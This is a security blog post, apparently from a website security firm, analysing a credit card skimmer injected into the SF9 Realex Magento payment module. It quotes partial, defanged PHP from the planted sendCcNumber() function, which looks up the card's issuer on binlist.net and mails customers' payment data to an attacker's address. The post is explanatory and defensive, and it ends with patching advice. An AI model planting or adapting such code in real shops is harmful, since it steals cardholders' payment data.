@@ -1,0 +1,52 @@
+SF9 Realex Magento Module Targeted by Credit Card Scrapers
+
+Attackers are constantly developing new techniques to compromise ecommerce websites and steal sensitive data. Over the last several weeks, we tracked massive attacks against Magento sites where attackers are injecting malicious scripts that create functions designed to steal credit card information.
+This technique is not restricted to Magento core files. These days, attackers are trying different methods to get access to the payment card data. For that reason, I’d like to describe some interesting credit card scrapers for Magento that are on the rise.
+Malware Injections in Payment Modules
+In this particular case, we found a malicious function specifically targeting the Magento payment module SF9 Realex. SF9 integrates with the Realex RealAuth Remote and Redirect systems, very popular solutions in the Magento community.
+The malicious function had been injected after the website was compromised through a different vulnerability, therefore the component itself (SF9 Realex) wasn’t the source of the problem.
+How the SF9 Module Works
+In order to understand the impact of the attack and exactly what data could be leaked, it’s important to understand how the module works.
+According to Magento Commerce, Magento Realex Payments Extension offers the additional feature of processing Mail and Telephone orders (MoTo). This allows you to enter the payment details of the customer yourself to process charges.
+Features:
+
+MoTo and Subscription included
+The customer’s basket is stored in the session and is not lost if a customer goes back in the browser
+Works with the Subscription Manager for Magento of sellXed
+API Integrations to refund, capture or void transactions directly out of the backend
+Integrated with Magento’s multi-shop features
+Dynamic Template, Hidden Authorization, and Token System are covered
+
+Malicious Functions Found
+Now let’s have a look at an example we found. A malicious function called sendCcNumber() was inserted inside of the Remote.php file located at /app/code/community/SF9/Realex/Model
+First of all, in the beginning of the code this function was declared as $this->sendCcNumber(), but this function doesn’t exist in the original version of the SF9 Realex.
+public function assignData($data)
+{
+…
+$this->sendCcNumber();
+return $this;
+}
+The function is created later in the same file:
+function sendCcNumber()
+{
+……
+$data15 = $info->getCcType();
+$data16 = substr($info->getCcNumber(), 0,6);
+$issued = json_decode(file_get_contents("hxxp://www.binlist[.]net/json/".$data16));
+…
+$encode = "removed@attacker.com";
+$salt    = "$data9 Payment: $data15/$data16/$data17";
+…
+mail($encode, $salt, $payfull, $headr);
+}
+The main purpose of the malicious function is to collect personal data being entered by a customer. From there, this function sends it to the attacker’s email address hidden inside the variable $encode using the mail function at the end of the snippet above.
+Identifying the Credit Card Issuer
+Another very interesting thing to note is that the attacker uses binlist[.]net to get the Issuer Identification Numbers (IIN).
+The first 6 digits of a credit card number are known as the Issuer Identification Number (IIN), previously known as Bank Identification Number (BIN). These identify the institution that issued the card to the card holder.
+We can see the function is using the variable $data16 and returns the value encoded in JSON in the appropriate PHP type.
+$data16 = substr($info->getCcNumber(), 0,6);
+$issued = json_decode(file_get_contents("hxxp://www.binlist[.]net/json/".$data16));
+Conclusion
+Magento credit card stealers are indeed on the rise. While the information here is specific to Magento, realize that this can affect any platform that is used for ecommerce. As the industry grows, so will the specific attacks targeting it. That’s why it is so important to keep your Magento website up to date and apply all the latest security patches!
+If you are uncertain how to update, you can protect your website with automatic virtual patching via the Sucuri Firewall. You should make sure your administration panel uses long, complex passwords that are difficult to brute force. You should also spend some time becoming familiar with our series of PCI compliance posts.
+Update: We have just released a Magento security guide. Check it out!
